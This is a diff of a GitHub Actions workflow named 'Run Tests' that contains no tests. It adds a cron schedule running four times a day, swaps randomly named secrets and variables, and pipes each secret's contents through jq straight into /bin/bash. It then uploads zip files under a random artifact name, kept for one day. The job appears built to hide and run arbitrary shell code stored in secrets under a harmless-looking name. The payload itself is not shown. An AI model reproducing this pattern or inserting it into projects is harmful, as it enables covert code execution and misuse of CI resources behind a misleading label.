@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '55 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -9,17 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          fs54: ${{ secrets.fs54 }}
+          qv8: ${{ secrets.qv8 }}
         run: |
-          printf '%s' "$fs54" | jq -r .w9 | /bin/bash
-          echo $s46753 | jq -r .deiwq2059 | /bin/bash
-          echo $elx65990 | jq -r .hvoh02 | /bin/bash
-          echo $grl57956 | jq -r .uvc430 | /bin/bash
-          echo $dqnmb956 | jq -r .z49 | /bin/bash
+          printf '%s' "$qv8" | jq -r .tu0297 | /bin/bash
+          echo $t766 | jq -r .cfwn3 | /bin/bash
+          printf '%s' "$qvbjb9514" | jq -r .bifr84176 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: e66EjVpH
+          name: A9reci6s
           path: "*.zip"
           retention-days: 1
